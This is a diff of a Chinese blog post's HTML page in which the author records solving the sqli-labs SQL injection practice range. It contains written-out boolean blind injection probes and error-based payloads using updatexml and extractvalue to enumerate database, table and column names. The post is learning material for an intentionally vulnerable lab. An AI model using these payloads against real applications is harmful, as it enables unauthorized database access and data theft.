@@ -14,7 +14,7 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="sqli_labs，一个印度老哥搭建的sql注入靶场，十分方便学习SQL注入，我将在本文持续更新我的闯关历程。">
+  <meta name="description" content="sqli_labs，一个印度老哥搭建的sql注入靶场，十分方便学习SQL注入，我将在本文记录我的闯关历程。">
   <meta name="author" content="Eggs">
   <meta name="keywords" content="Blog">
   
@@ -194,7 +194,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      5.1k 字
+      5k 字
     </span>
   
 
@@ -237,7 +237,7 @@
             <h1 style="display: none">sql_ilabs闯关历程第一页（1~20）</h1>
             
             <div class="markdown-body">
-              <p>sqli_labs，一个印度老哥搭建的sql注入靶场，十分方便学习SQL注入，我将在本文持续更新我的闯关历程。</p>
+              <p>sqli_labs，一个印度老哥搭建的sql注入靶场，十分方便学习SQL注入，我将在本文记录我的闯关历程。</p>
 <span id="more"></span>
 
 <p>由于确实没啥基础，做这个题还是靠网上教程，争取总结到位，有自己的思考。靶场搭建过程略去。</p>
@@ -332,7 +332,7 @@
 <p>即像这种一步步爆破的方式。这还只是得到了一个模糊的信息，注入的工作还远远没完成。所以学会利用工具是很有必要的。</p>
 <figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos">输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">97</span>（小写字母a的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">122</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值小于<span class="hljs-number">122</span>（小写字母z的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">109</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">109</span>（小写字母m的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不小于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不大于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br><br><span class="hljs-comment">//substr(xxx,y,z)，指的是从xxx中第y个字符开始取出z个字符。</span><br><span class="hljs-comment">//所以数据库名的第一个字符的ascii值为115，即小写字母s。</span><br><span class="hljs-comment">//其它位依次操作，得到结果security</span><br></code></pre></div></td></tr></table></figure>
 
-<p>老实说到这里光靠手注我已经进行不下去了…上脚本。</p>
+<p>真的有人会手工注入盲注类型的吗…上脚本。</p>
 <p>关于脚本的编写请见我这一篇文章，传送门：<a target="_blank" rel="noopener" href="https://eggswoo.com/2021/06/16/py-script-sql-injection/">用python编写一个sql注入脚本 - 蛋窝窝 (eggswoo.com)</a></p>
 <p>这个脚本比较low，但具备了完成该任务的基本功能，要完成其他注入则需要升级。</p>
 <p>payload:查找security.users中的password</p>
@@ -406,10 +406,10 @@
 <li> updatexml（）</li>
 </ul>
 <p>基本格式：</p>
-<figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">?id=1<span class="hljs-built_in"> and/or </span>updatexml(1,(payload),1)<br>?id=1<span class="hljs-built_in"> and/or </span>extractvalue(1,concat(0x7e,(payload),0x7e))<span class="hljs-comment">#</span><br>//仍然需要先尝试使用单双引号来先闭合语句再来构造sql注入语句<br>//extractvalue()比updatexml()少一个参数,concat()函数有时可加有时不能加，直接记住第二种是最万能的<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">?id=1<span class="hljs-built_in"> and/or </span>updatexml(1,(payload),1)<br>?id=1<span class="hljs-built_in"> and/or </span>extractvalue(1,concat(0x7e,(payload),0x7e))<span class="hljs-comment">#</span><br>//仍然需要先尝试使用单双引号来先闭合语句再来构造sql注入语句<br></code></pre></div></td></tr></table></figure>
 
 <p>在这里执行语句如下</p>
-<p>(你会发现下面三种语句好像都不是固定的语法，我找了下规则还是觉得</p>
+<p>(你会发现下面三种语句好像都不是固定的语法，我尝试找了下规则，还是觉得记住</p>
 <p>**<code>extractvalue(1,concat(0x7e,(payload),0x7e))#</code>**这一种形式就好了)</p>
 <figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-comment">//查询当前数据库</span><br>passwd=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(database(</span>))))#</span><br><span class="hljs-function"><span class="hljs-comment">//查询所有的数据库名</span></span><br><span class="hljs-function">passwd</span>=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),1)#</span><br><span class="hljs-function"><span class="hljs-comment">//查user下的表名</span></span><br><span class="hljs-function">passwd</span>=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))<span class="hljs-meta">#</span><br></code></pre></div></td></tr></table></figure>
 
